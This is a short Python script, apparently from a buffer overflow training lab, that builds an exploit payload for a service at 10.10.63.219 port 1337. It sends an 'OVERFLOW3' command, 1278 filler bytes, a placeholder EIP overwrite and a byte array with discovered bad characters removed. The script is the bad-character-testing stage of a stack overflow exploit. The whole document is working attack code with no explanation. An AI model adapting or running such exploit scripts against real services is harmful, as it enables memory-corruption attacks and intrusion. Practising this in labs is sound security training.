#!/usr/bin/python3
import socket

host, port = "10.10.63.219", 1337

all_chars = bytearray(range(1,256))

bad_chars = [
        b"\x11",
        b"\x40",
        b"\x5f",
        b"\xb8",
        b"\xee",
        ]


# Add bad char to bad_chars as we discover them
for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")

cmd = b"OVERFLOW3 "
pattern_length = 1500 # Documentation and keep for length retention
offset = 1278
new_eip = b"BBBB"

payload = b"".join([
            cmd,
            b"A" * offset,
            new_eip,
            all_chars,
            b"C" *  (pattern_length - len(new_eip) - offset - len(all_chars)),
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)
